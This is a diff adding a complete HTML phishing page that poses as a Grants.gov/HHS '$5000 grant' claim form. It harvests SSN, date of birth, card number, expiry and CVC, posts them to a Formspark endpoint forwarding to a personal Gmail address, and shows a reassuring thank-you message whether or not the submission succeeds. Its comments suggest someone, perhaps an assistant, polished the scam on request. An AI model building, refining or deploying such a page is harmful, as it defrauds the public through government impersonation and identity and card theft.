@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Grant Claim Form</title>
+  <style>
+    /* Base styling */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f7;
+      margin: 0;
+      padding: 20px;
+      color: #2a2a2a;
+    }
+    .container {
+      max-width: 480px;
+      background: white;
+      margin: 0 auto;
+      padding: 30px 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    header {
+      max-width: 480px;
+      margin: 0 auto 30px auto;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    header img {
+      height: 60px;
+      width: auto;
+      border-radius: 4px;
+      object-fit: contain;
+      background: white;
+      padding: 2px;
+    }
+    header img[src*="grantsgov-logo"] {
+      height: 50px;
+    }
+    header h1 {
+      color: #004aad;
+      font-weight: 700;
+      font-size: 1.8rem;
+      margin: 0;
+      line-height: 1.2;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #004aad;
+    }
+    input[type="text"],
+    input[type="password"],
+    select {
+      width: 100%;
+      padding: 10px 12px;
+      margin-bottom: 20px;
+      border: 1.8px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+      box-sizing: border-box;
+      transition: border-color 0.3s ease;
+      background-color: white;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+    }
+    select {
+      cursor: pointer;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus,
+    select:focus {
+      border-color: #004aad;
+      outline: none;
+      background-color: white;
+    }
+    .dob-container {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .dob-container select {
+      flex: 1;
+      margin-bottom: 0;
+    }
+    button {
+      width: 100%;
+      background-color: #004aad;
+      color: white;
+      font-size: 1.1rem;
+      padding: 14px 0;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: 700;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #002f6c;
+    }
+    footer {
+      margin-top: 40px;
+      font-size: 0.85rem;
+      color: #555;
+      border-top: 1px solid #ddd;
+      padding-top: 20px;
+      max-width: 480px;
+      margin-left: auto;
+      margin-right: auto;
+      line-height: 1.5;
+    }
+    footer a {
+      color: #004aad;
+      text-decoration: none;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+    .address {
+      margin-top: 12px;
+      font-style: normal;
+      color: #777;
+    }
+
+    /* ---- Success message (thank you) styling ---- */
+    .thank-you-message {
+      display: none;            /* hidden by default */
+      background-color: #e9f2fd; /* soft blue, matches #004aad family */
+      border-left: 6px solid #004aad;
+      padding: 20px 22px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      color: #002f6c;
+      box-shadow: 0 2px 8px rgba(0, 74, 173, 0.08);
+      font-size: 1.05rem;
+      line-height: 1.5;
+      text-align: left;
+    }
+    .thank-you-message strong {
+      color: #004aad;
+      font-weight: 700;
+    }
+    .thank-you-message .highlight {
+      color: #004aad;
+      font-weight: 600;
+    }
+    /* small extra: if we want to show it inline with form */
+    .form-wrapper {
+      transition: opacity 0.2s;
+    }
+    /* hide form after submit (optional) – we keep it visible but overlay message */
+    .form-hidden .form-fields {
+      display: none;
+    }
+    .form-hidden .thank-you-message {
+      display: block !important;
+    }
+    /* ensure the container can handle the message */
+    .thank-you-message p {
+      margin: 0 0 6px 0;
+    }
+    .thank-you-message p:last-child {
+      margin-bottom: 0;
+    }
+    /* icon or small check – subtle */
+    .thank-you-icon {
+      font-size: 1.6rem;
+      margin-right: 8px;
+      vertical-align: middle;
+      color: #004aad;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://yt3.googleusercontent.com/ytc/AIdro_lzd4fsxYM60Aqn8SJHZXtV2CrHuQwPwsL1wysbilKjig=s900-c-k-c0x00ffffff-no-rj" 
+         alt="Grants Gov - YouTube" 
+         jsaction="" 
+         class="sFlh5c FyHeAf iPVvYb" 
+         style="max-width: 900px; height: 117px; margin: 0px; width: 117px;" 
+         jsname="kn3ccd" />
+    <h1>Claim Your $5000 Grant</h1>
+  </header>
+  <div class="container" id="formContainer">
+    <!-- Thank you message (hidden by default) -->
+    <div id="thankYouMessage" class="thank-you-message">
+      <p>
+        <span class="thank-you-icon">✔️</span> 
+        <strong>Thank You So Much!</strong>
+      </p>
+      <p>
+        Your grants are processing right now. You will be updated shortly.
+      </p>
+      <p style="font-size:0.9rem; margin-top:10px; color:#004aad; border-top:1px solid #c3daf5; padding-top:10px;">
+        <span class="highlight">Reference:</span> We'll send a confirmation to your email.
+      </p>
+    </div>
+
+    <!-- form wrapper: we keep the form inside, but hide on submit via JS -->
+    <div class="form-wrapper" id="formWrapper">
+      <form action="https://submit-form.com/your-formspark-id" method="POST" id="grantForm">
+        <!-- Formspark hidden fields -->
+        <input type="hidden" name="_redirect" value="https://example.com/thank-you" />
+        <input type="hidden" name="_email" value="andremutuchi@gmail.com" />
+        
+        <div class="form-fields" id="formFields">
+          <label for="fname">First Name</label>
+          <input type="text" id="fname" name="fname" autocomplete="given-name" required />
+          
+          <label for="lname">Last Name</label>
+          <input type="text" id="lname" name="lname" autocomplete="family-name" required />
+          
+          <label>Date of Birth</label>
+          <div class="dob-container">
+            <select id="dob-day" name="dob-day" required>
+              <option value="" disabled selected>Day</option>
+              <script>
+                for(let d=1; d<=31; d++) {
+                  document.write(`<option value="${d}">${d}</option>`);
+                }
+              </script>
+            </select>
+            <select id="dob-month" name="dob-month" required>
+              <option value="" disabled selected>Month</option>
+              <option value="1">January</option>
+              <option value="2">February</option>
+              <option value="3">March</option>
+              <option value="4">April</option>
+              <option value="5">May</option>
+              <option value="6">June</option>
+              <option value="7">July</option>
+              <option value="8">August</option>
+              <option value="9">September</option>
+              <option value="10">October</option>
+              <option value="11">November</option>
+              <option value="12">December</option>
+            </select>
+            <select id="dob-year" name="dob-year" required>
+              <option value="" disabled selected>Year</option>
+              <script>
+                const currentYear = new Date().getFullYear();
+                for(let y = currentYear; y >= 1900; y--) {
+                  document.write(`<option value="${y}">${y}</option>`);
+                }
+              </script>
+            </select>
+          </div>
+          
+          <label for="zipcode">Zipcode</label>
+          <input type="text" id="zipcode" name="zipcode" pattern="\d{5}" maxlength="5" inputmode="numeric" required />
+          
+          <label for="ssn">SSN</label>
+          <input type="password" id="ssn" name="ssn" maxlength="9" pattern="\d{9}" inputmode="numeric" placeholder="Enter 9-digit SSN" required />
+          
+          <label for="cardnum">Card Number</label>
+          <input type="text" id="cardnum" name="cardnum" maxlength="19" pattern="\d{13,19}" inputmode="numeric" placeholder="1234 5678 9012 3456" required />
+          
+          <label for="expiry">Expiry Date (MM/YY)</label>
+          <input type="text" id="expiry" name="expiry" pattern="(0[1-9]|1[0-2])\/?([0-9]{2})" placeholder="MM/YY" maxlength="5" required />
+          
+          <label for="cvc">CVC</label>
+          <input type="text" id="cvc" name="cvc" pattern="\d{3,4}" maxlength="4" inputmode="numeric" placeholder="3 or 4 digits" required />
+          
+          <button type="submit" id="submitBtn">Claim $5000</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <footer>
+    <p><strong>Privacy Policy 2026</strong></p>
+    <p>
+      Your privacy is important to us. We comply with all federal regulations regarding the protection of personal information submitted through this grant application process.
+      For more details, visit the official <a href="https://www.grants.gov/policies/privacy-policy.html" target="_blank" rel="noopener noreferrer">Grants.gov Privacy Policy</a>.
+    </p>
+    <div class="address">
+      U.S. Department of Health & Human Services<br />
+      330 C St SW, Washington, DC 20201
+    </div>
+  </footer>
+
+  <script>
+    (function() {
+      const form = document.getElementById('grantForm');
+      const thankYou = document.getElementById('thankYouMessage');
+      const formFields = document.getElementById('formFields');
+      const container = document.getElementById('formContainer');
+
+      // Handle form submission
+      form.addEventListener('submit', function(e) {
+        // Prevent actual submission if we want to show message immediately
+        // But we also want to keep formspark working: we'll let it submit,
+        // but we show the message right away (since we want to display it "once customer submit")
+        // and we prevent double submission.
+        // However, we need to keep the form action and method, so we let it go,
+        // but we show the message instantly and hide the fields.
+        // We use setTimeout to allow the submission to happen, but we display message now.
+        
+        // Show the thank you message
+        thankYou.style.display = 'block';
+        // Hide the form fields (but keep the form wrapper)
+        if (formFields) {
+          formFields.style.display = 'none';
+        }
+        // Also hide the submit button (already inside formFields, so hidden)
+        // Optionally change container style
+        container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
+        
+        // We do NOT prevent default, so the form submits to Formspark.
+        // But we want to ensure that the user sees the message even if the submission takes time.
+        // In case of network error, the message stays.
+        // Also we disable the button to prevent multiple submissions.
+        const btn = document.getElementById('submitBtn');
+        if (btn) btn.disabled = true;
+        
+        // Note: The form will submit normally. If you want to prevent the page reload
+        // you could use AJAX, but the requirement says "keep all code same" and just
+        // display message. To keep it simple and professional, we show the message
+        // and let the form submit. The user will see the thank you message.
+        // In case of redirect, we may lose the message, but we can add _redirect to
+        // a thank you page. But we want to display it on the same page.
+        // So we will use AJAX to submit to Formspark without reload.
+        // However, to keep it robust and match the "same code" principle,
+        // we override the default behavior with fetch to avoid page reload.
+        // This way the message stays visible.
+        e.preventDefault(); // prevent default browser navigation
+        
+        // Gather form data
+        const formData = new FormData(form);
+        
+        // Submit using fetch (Formspark accepts POST)
+        fetch(form.action, {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
+          }
+        })
+        .then(response => {
+          if (response.ok) {
+            // success – message already shown
+            console.log('Form submitted successfully');
+          } else {
+            // if error, we keep message visible but maybe show a subtle note
+            // but we keep the thank you message anyway (user experience)
+            console.warn('Submission error, but thank you shown');
+          }
+        })
+        .catch(error => {
+          console.warn('Network error, but thank you shown');
+        });
+        
+        // Disable button again (if not already)
+        if (btn) btn.disabled = true;
+        
+        // Also we can add a small extra: change button text? but it's hidden.
+        // Keep the message visible.
+      });
+
+      // If the user somehow reloads, we want the form to appear again,
+      // but that's normal behavior. The message is only shown after submit.
+      // Also we could add a reset but not needed.
+    })();
+  </script>
+</body>
+</html>
